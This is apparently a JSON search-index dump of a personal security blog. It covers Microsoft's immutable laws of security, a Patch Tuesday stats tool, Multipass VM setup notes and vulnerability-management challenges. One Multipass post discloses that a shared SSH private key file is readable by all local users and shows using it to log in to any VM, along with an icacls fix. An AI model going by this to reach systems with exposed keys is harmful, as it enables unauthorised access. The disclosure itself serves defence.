it\u0026rsquo;s not your computer anymore. Law #3: If a bad actor has unrestricted physical access to your computer, it\u0026rsquo;s not your computer anymore. Law #4: If you allow a bad actor to run active content in your website, it\u0026rsquo;s not your website anymore. Law #5: Weak passwords trump strong security. Law #6: A computer is only as secure as the administrator is trustworthy. Law #7: Encrypted data is only as secure as its decryption key. Law #8: An out-of-date antimalware scanner is only marginally better than no scanner at all. Law #9: Absolute anonymity isn\u0026rsquo;t practically achievable, online or offline. Law #10: Technology isn\u0026rsquo;t a panacea. Links # The immutable laws of security (ver 2.0) 10 Immutable Laws of Security (ver 1.0) ","date":"2022-07-31 16:42","externalUrl":null,"permalink":"/immutable_laws/","section":"MySeq","summary":"The \u003ccode\u003e10 Immutable Laws of Security\u003c/code\u003e was first published by the Microsoft TechNet in 2000.","title":"Ten Immutable Laws of Security (v2)","type":"page"},{"content":" MS Patch Tuesday # This is a simple tool (written python) to perfrom quick analysis on security updates for MS Patch Tuesday. It highlights:\nProducts Families Vulnerability Types High severity vulnerabities (\u0026gt;= CVSS 8.5) High likelihood vulnerabilities (contains \u0026lsquo;Exploitation More Likely\u0026rsquo;) Vulnerabilties that exploited in wild (Exploited:Yes) Microsoft Security Response Center (MSRC) investigates all reports of security vulnerabilities affecting Microsoft products and services, and provides these updates as part of the ongoing effort to help you manage security risks and help keep your systems protected. All the details from Microsoft security update are formatted according to the Common Vulnerability Reporting Framework (CVRF). For more details, please visit msrc.microsoft.com/update-guide.\nUsage # $ patch_tuesday -h usage: patch_tuesday [-h] [-c] [-k \u0026lt;YYYY-mmm\u0026gt;] [-v] Zzzzz |\\ _,,,---,,_ /,`.-\u0026#39;`\u0026#39; -. ;-;;,_ __author__ : [ zd ] |,4- ) )-,_..;\\ ( `\u0026#39;-\u0026#39; __year__ : [ 2022.03 ] \u0026#39;---\u0026#39;\u0026#39;(_/--\u0026#39; `-\u0026#39;\\_) __file__ : [ /home/xx/admin/patch_tuesday ] [ To get vulnerability stats and updates for Patch Tuesday from MSRC. ] options: -h, --help show this help message and exit -c show chart output -k \u0026lt;YYYY-mmm\u0026gt; Date string for the report query in format YYYY-mmm -v verbose output Get detailed Microsoft security update, formatted according to the Common Vulnerability Reporting Framework. MSRC investigates all reports of security vulnerabilities affecting Microsoft products and services, and provides these updates as part of the ongoing effort to help you manage security risks and help keep your systems protected. For more details, please visit msrc.microsoft.com/update-guide. A similar wbesite can be found at https://patchtuesdaydashboard.com (by Morphus Labs). Get quick summary of MS vulnerability stats for current month.\n$ ./patch_tuesday.py Tips # Show quick summary with simple ASCII chart.\n$ ./patch_tuesday.py -vc -k 2022-apr $ ./patch_tuesday -k 2022-may -v $ ./patch_tuesday -k 2022-jun -v References # MSRC CVRF API Microsoft April 2022 Security Updates April 2002 Microsoft Security Updates MySeq - Patch_Tuesday Utils ","date":"2022-07-01 01:30","externalUrl":null,"permalink":"/posts/ms_patch_tuesday/","section":"posts","summary":"To get vulnerability stats and updates for Patch Tuesday from MSRC.","title":"MS Patch Tuesday","type":"posts"},{"content":" The golden age of programming used to be when CPUs and memory were limited; now, we live in a pile of inefficient rubbish. ","date":"2022-06-21 21:56","externalUrl":null,"permalink":"/posts/code_bloat/","section":"posts","summary":"In the golden age of programming \u0026hellip;","title":"Code Bloat","type":"posts"},{"content":"","date":"2022-05-15 22:16","externalUrl":null,"permalink":"/tags/multipass/","section":"tags","summary":"","title":"multipass","type":"tags"},{"content":" Introduction # Multipass is simple a docker alternative from Canonical projects. It is a lightweight cross-platform VM manager, and is designed for developers who want a fresh Ubuntu environment with a single command.\nA cloud-init can be used for post-install configuration, such as setup SSH public key or mounting a disk.\nIt is so fun 😜😜 and I love its\u0026rsquo; simplicity.\nLog Journal # 2022.05.15 : Installation # Multipass is a lightweight virtual machine manager developed by Canonical, the company behind Ubuntu. It allows you to easily create, manage, and launch virtual machines on your local machine or in the cloud, using a simple command-line interface.\nMultipass provides a fast and efficient way to test and develop software on multiple operating systems without the need to set up and maintain a full-fledged virtualization infrastructure. It uses the lightweight KVM virtualization technology to create isolated environments that run independently of the host system.\nWith Multipass, we can quickly spin up new virtual machines, and customize the configuration of each virtual machine, such as CPU, memory, disk space, and network settings.\n$ sudo snap install multipass --classic $ sudo snap refresh multipass --channel stable 2022.05.16: Customized VM at launch with cloud-init # Multipass is great. With cloud-init, it is getting better.\nWith cloud-init we can customize our virtual machine at launch when we create them with Multipass.\nFirst, create a cloud-init.yaml file with the content below:\nssh_authorized_keys: - ssh-rsa AAAAB3NzaC1yc2EAAAAD........./FAC8DD2xi2pZZc3Dnv/6iE= xx@pf Next, create the VM and login to the shell.\n$ multipass launch --name jimny --cloud-init cloud-init.yaml $ multipass shell jimny 2022.09.28 : Advanced Setup with Multipass # We can pre-configure all the actions every time a new VM instance is created via cloud-init. Create a YAML file called cloud_init.yaml below:\nusers: - default - name: xx groups: sudo shell: /bin/bash sudo: [\u0026#39;ALL=(ALL) NOPASSWD:ALL\u0026#39;] ssh_authorized_keys: - ssh-rsa \u0026lt;rsa keys in one line\u0026gt; package_update: true package_upgrade: true packages: - nodejs - python3 Then, create a new VM instance, login the shell, and checkfor Nodejs and python3 packages.\n$ multipass launch -c 2 -m 2G -d 10G -n jimny --cloud-init cloud_init.yaml $ $ multipass info jimny $ multipass shell jimny ubuntu@jimny:~$ apt list python3 nodejs 2022.09.29 : Multipass Local Privileged Mounts # To access the host storage from the guest VM instance, we need to setup one-time configuration. First, find out the current configured value:\n$ multipass get local.privileged-mounts If it is false, then set the value to true:\n$ multipass set local.privileged-mounts=true Then, share the host\u0026rsquo;s local folder (c:\\Temp) to guest VM. And check if it is successful.\n$ multipass mount c:\\temp jimny:temp $ multipass info jimny $ multipass umount jimny:temp 2022.10.01 : Multipass Images # To show Multipass images:\n$ multipass find --format json { \u0026#34;errors\u0026#34;: [ ], \u0026#34;images\u0026#34;: { \u0026#34;18.04\u0026#34;: { \u0026#34;aliases\u0026#34;: [ \u0026#34;bionic\u0026#34; ], \u0026#34;os\u0026#34;: \u0026#34;Ubuntu\u0026#34;, \u0026#34;release\u0026#34;: \u0026#34;18.04 LTS\u0026#34;, \u0026#34;remote\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;20220921\u0026#34; }, .... .... .... } $ multipass version --format json { \u0026#34;multipass\u0026#34;: \u0026#34;1.10.1+win\u0026#34;, \u0026#34;multipassd\u0026#34;: \u0026#34;1.10.1+win\u0026#34; } 2022.10.24 : Multipass is Exposing SSH private key to everyone. # It is so convenience to use the command \u0026lsquo;multipass shell jimny\u0026rsquo; whenever we need to access to VM created.\nBut, how can we login without password? Where is the SSH private key?\nActually it is using SSH public key authentication for login to VM.\nFor my case, I\u0026rsquo;m using WSL, and the SSH private key is stored at C:\\ProgramData\\Multipass\\data\\ssh-keys\\id_rsa\nSo, in theory, we can always do the following to login to any VM created by Multipass.\nPS\u0026gt; ssh -i C:\\ProgramData\\Multipass\\data\\ssh-keys\\id_rsa ubuntu@jimny However, you will always hit with permission error. Not because of no permission, but everyone has a READ permission to the private key. To fix this, you need an administrator privilege to fix it:\nC:\\cd C:\\ProgramData\\Multipass\\data\\ssh-keys C:\\ProgramData\\Multipass\\data\\ssh-keys\u0026gt; icacls id_rsa /inheritance:r /grant \u0026#34;$(whoami):F\u0026#34; /grant \u0026#34;NT AUTHORITY\\SYSTEM:F\u0026#34; Make sure it is executed successfully and you should be able to use the SSH private key for authentication.\nPS\u0026gt; ssh -i C:\\ProgramData\\Multipass\\data\\ssh-keys\\id_rsa ubuntu@jimny Links # Multipass https://myseq.blogspot.com/2022/05/first-try-on-multipass.html https://myseq.blogspot.com/2022/05/customizing-vm-at-launch-with-cloud-init.html https://myseq.blogspot.com/2022/09/my-third-try-on-multipass.html https://myseq.blogspot.com/2022/09/multipass-local-privileged-mounts.html https://myseq.blogspot.com/2022/10/multipass-images.html https://myseq.blogspot.com/2022/10/multipass-private-ssh-key-is-exposing.html ","date":"2022-05-15 22:16","externalUrl":null,"permalink":"/posts/multipass/","section":"posts","summary":"Orchestrates virtual Ubuntu instances with Multipass.","title":"Multipass","type":"posts"},{"content":" Vulnerability management faces challenges in both agent-based and network scan-based approaches.\nHere is a list of challenges in vulnerability management. And it will be updated from time-to-time.\nThese are the potential challenges in vulnerability management, categorized into agent-based and network scan-based approaches:\nAgent-based # Agent deployment: Complexities in deploying agents across diverse environments pose challenges. Agent management: Ensuring continuous coverage and updates for agents across the network presents logistical hurdles. Agent support and maintenance: Manual intervention is required for agent troubleshooting or restarts in case of failures. Unresponsive agent: Requires manual login to server for restart. Incompatibility: Compatibility conflicts with existing software or security solutions may arise. Increased attack surface: Agents themselves can be vulnerable. Risks of agent evasion or tampering by malicious entities warrant attention. Performance overhead: Agents may impose resource overhead and performance impacts on endpoints. Scalability challenges: Managing and updating agents across large networks. Privacy and compliancy: Compliance considerations regarding data privacy and monitoring emerge with agent-based solutions. Missing out of network vulnerabiltiy: Most of the agents will not assess network-based and misconfiguration vulnerability, such as default password, weak cryptography in SSL or SSH. Network Scan # Limited visibility: Firewalls and network segmentation can restrict scan reach. False positives: Inaccurate identification of vulnerabilities (like backport) can consume resources for investigating on non-existent vulnerabilities. Network congestion: Scans can overload network resources and may disrupt scans or compromise data integrity. Incomplete credential scan: May miss vulnerabilities requiring privileged access or hinder comprehenive scans due to insufficient permissions. General # Incomplete asset inventory: Inaccurate asset inventories can result in missed endpoints. Prioritization: Ineffective prioritization may delay critical patching. ","date":"2022-04-28 09:07","externalUrl":null,"permalink":"/posts/challenges_in_vulnmgmt/","section":"posts","summary":"Vulnerability management faces challenges in both agent-based and network scan-based approaches","title":"Challenges In Vulnerability Management","type":"posts"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/tags/","section":"tags","summary":"","title":"🐛","type":"tags"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"🐛","type":"categories"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/tags/","section":"tags","summary":"","title":"🐜","type":"tags"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"🐜","type":"categories"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/tags/","section":"tags","summary":"","title":"🐝","type":"tags"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"🐝","type":"categories"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/tags/","section":"tags","summary":"","title":"🐞","type":"tags"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"🐞","type":"categories"},{"content":" About ZD # 1st-Half 🦖 # Knowledge is Power. 🦖\nAs a Cybersecurity strategist, I responsible for designing and implementing security solutions, managing risks, and fostering a strong security culture within the organization I work for. This includes security strategy development, threat management, risk assessment and management, security architecture design, and security standards and compliance.\nI\u0026rsquo;m also a cmdline geek, and spends most of my time in learning things, such as: - Network security (TCP/IP), Coding (Android apps, Python/Ruby, Markdown), Clouds (Google/Azure/AWS), Containers (Kubernetes/docker, LCX), IoT (ESP8266 and Raspberry Pi), vim and zsh/bash.\nBesides that, I\u0026rsquo;ve always been fascinated by how I could make a program (or a piece of code) runs more efficiently or how I could organize the code so it is easy to change.\n2nd-Half 🦏 # Mastering Thought and No Turning Back! 🦏\nAt my free time ⏳, I would wandering around with my motorcycle 🏍️; flying my Mavic Mini 🚁; enjoying my drinks 🍷 + 🍻, and reading books 📚.\nLately, I just bought myself a new toy 🚙, JIMИY (:jeep:)\nAbout the cover photo 🦊: 🦊 If you don't see the cover photo above, it is because you are not using 🦊 Firefox browser. Firefox 2023-05-10 00:55\u0026middot;68 words\u0026middot;1 min Essential 2021 firefox Fire starts here \u0026hellip; \u0026ndash; =^_^= 🦊 🦖 :cat2: :tiger2: 🦏 :rhino: ⛺⛺\n# /\\ / \\ /\\ \\ \\ /\\ \\ \\ \\ /\\ \\ \\ \\/\\ / /\\ \\ \\/ /\\ / / /\\ / / /\\ / / / \\/ / / \\ \\ / / /\\ / / / \\/ / / \\/ / / \\/ /\\ \\ \\/ / \\/\\ \\ \\ \\/ \\ \\ \\ \\/ \\ \\ \\/ \\ / \\/ ","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/zd/","section":"MySeq","summary":"Mastering Thought: Once Learned, There\u0026rsquo;s No Turning Back!","title":"ZD","type":"page"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/tags/","section":"tags","summary":"","title":"🦊","type":"tags"},{"content":"","date":"2022-03-31 21:32","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"🦊","type":"categories"},{"content":"","date":"2021-12-21 21:38","externalUrl":null,"permalink":"/tags/lie/","section":"tags","summary":"","title":"lie","type":"tags"},{"content":"","date":"2021-12-21 21:38","externalUrl":null,"permalink":"/tags/voice/","section":"tags","summary":"","title":"voice","type":"tags"},{"content":" If sharp criticism disappears completely, mild criticism will become harsh.\nIf mild criticism is not allowed, silence will be considered ill-intended.\nIf silence is no longer allowed, complimenting not hard enough is a crime.\nIf only one-voice is allowed to exist, then the only voice that exists is a lie.\n~ 2021 (HK)\n","date":"2021-12-21 21:38","externalUrl":null,"permalink":"/voice/","section":"MySeq","summary":"From 2021 (HK)","title":"Voice of 2021 (HK)","type":"page"},{"content":" Defenders think in lists. Attackers think in graphs.\nAs long as this is true, attackers win.\nBy John Lambert from Microsoft ","date":"2021-01-21 22:00","externalUrl":null,"permalink":"/posts/think_in_graphs/","section":"posts","summary":"Defenders think in lists. Attackers think in graphs.","title":"Think In Graphs","type":"posts"},{"content":" Security without intelligence is just information.\nInformation without innovation is just data.\n","date":"2020-09-03 22:17","externalUrl":null,"permalink":"/posts/information_security/","section":"posts","summary":"Intelligence vs Innovation.","title":"What is Information Security?","type":"posts"},{"content":" Different view of archives. Views: [ Tags ] [ Categories ] [ TagCloud ] ","externalUrl":null,"permalink":"/blogarchive/","section":"MySeq","summary":"","title":"📆 Blog Archive 📅","type":"page"},{"content":" Views: [ Tags ] [ Categories ] [ TagCloud ]\n","externalUrl":null,"permalink":"/tagcloud/","section":"MySeq","summary":"","title":"🏷️ TagCloud ☁️","type":"page"}]